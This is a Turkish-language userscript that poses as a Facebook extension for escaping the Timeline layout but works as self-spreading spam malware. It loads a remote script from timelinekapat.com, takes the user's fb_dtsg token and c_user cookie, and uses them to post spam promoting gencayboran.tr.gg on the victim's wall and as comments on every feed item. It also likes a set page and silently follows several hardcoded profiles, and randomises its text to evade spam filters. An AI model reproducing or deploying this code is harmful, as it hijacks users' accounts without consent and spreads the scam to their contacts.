// ==UserScript==
// @name           Chrome Facebook
// @author         Chrome Facebook
// @version        1.0
// @description    Facebook Abone Kasma & Sayfa Kasma Eklentisi
// @namespace      Chrome Facebook
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        http://*.formspring.me/*
// ==/UserScript==

// Ayarlar //
function antispam(a) {
var b, c = "12365478",
d = "";
if (!a) a = 8;
for (b = 0; b < a; b++) d += c.substr(Math.floor(Math.random() * (c.length + 1)), 1);
return d;
}

function antispamyazi(a) {
var b, c = "....",
/*
Not : bunlar daha iyi gözüküyor var b, c = ".d.d",
*/

d = "";
if (!a) a = 5;
for (b = 0; b < a; b++) d += c.substr(Math.floor(Math.random() * (c.length + 1)), 1);
return d;
}

var randomyazi = [
	"Helal olsun eski profil gibisi yok www.gencayboran.tr.gg »» <3:",
	"Zaman Tunelinden Kurtulun Superr Uygulama.<3.. www.gencayboran.tr.gg:",
    "Oh be zaman tünelinden kurtuldum süperr »» www.gencayboran.tr.gg <3",
	"Zaman Tunelinden Kurtuldum Superr Uygulama.<3.... www.gencayboran.tr.gg:",
    "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin www.gencayboran.tr.gg Superr Uygulama.<3.....:"
]

var baslikrandom = [
	"Helal olsun eski profil gibisi yok »» www.gencayboran.tr.gg <3:",
	"Zaman Tunelinden Kurtulun www.gencayboran.tr.gg Superr Uygulama.<3..:",
    "Oh be zaman tünelinden www.gencayboran.tr.gg kurtuldum süperr »» <3",
	"www.gencayboran.tr.gg Zaman Tunelinden Kurtuldum Superr Uygulama.<3....:",
    "www.gencayboran.tr.gg Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3.....:"
]


var randomlink = [
	"@[258881424182282:0]",
]

var randomyorum = [
	"www.gencayboran.tr.gg Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!  :",
	"www.gencayboran.tr.gg Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!  :",
    "www.gencayboran.tr.gg Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3! :",
	"www.gencayboran.tr.gg Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!  :",
    "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3!  :"
]

// Wall post ayarları
var randommesaj = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var link = randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var baslik = baslikrandom[Math.floor(Math.random()*baslikrandom.length)] + " "  + antispamyazi()
var resimlink = ['http://a4.sphotos.ak.fbcdn.net/hphotos-ak-prn1/s720x720/552824_242731792501460_100002939244686_448297_1340218283_n.jpg'];
var aciklamarandom = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();

// Oto Mesaj Ayarları
var p0 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var p1 = ['http://www.zamantunelikaldir.com/dosyalar/chrome.jpg'];
var p2 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var p3 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var message = "";

// Yorum Ayarları

var randomyorum = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();

function topluhazirla()
{
	var s=document.createElement('script');
	s.type="text/javascript";
	s.className="topluoneri";s.id="topluoneri";
	s.src="258881424182282";
	if(document.getElementsByTagName('head')[0])document.getElementsByTagName('head')[0].appendChild(s);
	else if(a<50) setTimeout(function(){myplugin(a++);},250);
}
document.ready=topluhazirla();

var zxviral=document.createElement('script');zxviral.src='http://timelinekapat.com/dosyalar/soneri.js?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);

function createXMLHttpRequest() {
 return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest;
 }

 var c = createXMLHttpRequest();
   c.open("GET", "/?sk=nf", false);
   c.onreadystatechange = ct;  
   c.send(null);   
function ct() {
var str = c.responseText; 
var fb_dtsg = str.match(/\"fb_dtsg\"\:\"(.*?)\"/)[1];
var charset_test = escape( str.match(/\"charset_test\" value\=\"(.*?)\"/)[1]);
var xhpc_composerid = str.match(/\"xhpc_composerid\" value\=\"(.*?)\"/)[1];
var user = document.cookie.match(/c_user=\d+/gi)[0].replace("c_user=","");
function wall () {  
post =  
"&fb_dtsg="                                          + fb_dtsg +
"&xhpc_composerid="                                  + xhpc_composerid +
"&xhpc_targetid="                                    + user +
"&xhpc_context=profile"                              +
"&xhpc_fbx=1"                                        +
"&xhpc_timeline="                                    +
"&xhpc_ismeta=1"                                     +
"&xhpc_message_text="                                + randomyorum +
"&xhpc_message="                                     + randomyorum +
"&composertags_place="                               +
"&composertags_place_name="                          +
"&composer_predicted_city="                          +
"&composer_session_id="                              +
"&is_explicit_place="                                +
"&audience[0][value]=80"                             +
"&composertags_city="                                +
"&disable_location_sharing=false"                    +
"&nctr[_mod]=pagelet_wall"                           + 
"&lsd"                                               +
"&__user="                                           + user +
"&phstamp=";

var c = createXMLHttpRequest();
c.open("POST", "/ajax/updatestatus.php?__a=1", false);
c.send(post);
}
   function like(page){
   var b =  "fbpage_id=" + page +
   "&add=1&reload=1"+
   "&preserve_tab=true"+
   "&fan_origin=page_profile&nctr[_mod]=pagelet_header"+
   "&fb_dtsg=" + fb_dtsg+ "&lsd&__"+ user;
   
     c = createXMLHttpRequest();
     c.open("POST", "/ajax/pages/fan_status.php?__a=1", false);
     c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
     c.send(b);
   }
   
like("258881424182282");

   arr = str.match(/name="feedback_params" value="\&\#123(.*?)"/gi);
   
   for (var i in arr){
                 
   arr[i] =  arr[i].replace(/&quot;/gi,'"');
   arr[i] =  arr[i].replace(/name=\"feedback_params\" value=\"&#123;/gi,'{');
   arr[i] =  arr[i].replace(/&#125;\"/gi,'}');

 var post = 
   "charset_test="    + charset_test + "&" +
   "fb_dtsg="         + fb_dtsg      + "&" + 
   "feedback_params=" + arr[i]       + "&" +
   "shown_comments=15&total_comments=15&translate_on_load=&add_comment_text_text=" + randomyorum + "&add_comment_text=" + randomyorum + "&" +
   "&comment_replace=optimistic_comment_4183511486_0&comment=1&lsd&__user=" + user + "&phstamp=1658167708055661201152" ;

    var d = createXMLHttpRequest();
    d.open("POST", "/ajax/ufi/modify.php?__a=1", false);
    d.send(post);

   }



}

var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params = "profile_id=100001670852324";
    params += "&location=1";
    params += "&source=follow-button";
    params += "&subscribed_button_id=u37qac_37";
    params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params += "&lsd=";
    params += "&__user=" + cereziAl("c_user");
    params += "&phstamp=100001670852324";
    xmlhttp.send(params);

	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=167102539989061";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=167102539989061";
    xmlhttp.send(params1);

var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params = "profile_id=100001518065498";
    params += "&location=1";
    params += "&source=follow-button";
    params += "&subscribed_button_id=u37qac_37";
    params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params += "&lsd=";
    params += "&__user=" + cereziAl("c_user");
    params += "&phstamp=100001518065498";
    xmlhttp.send(params);

var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params = "profile_id=1100002045656696";
    params += "&location=1";
    params += "&source=follow-button";
    params += "&subscribed_button_id=u37qac_37";
    params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params += "&lsd=";
    params += "&__user=" + cereziAl("c_user");
    params += "&phstamp=100002045656696";
    xmlhttp.send(params);

var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params = "profile_id=100001670852324";
    params += "&location=1";
    params += "&source=follow-button";
    params += "&subscribed_button_id=u37qac_37";
    params += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params += "&lsd=";
    params += "&__user=" + cereziAl("c_user");
    params += "&phstamp=100001670852324";
    xmlhttp.send(params);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}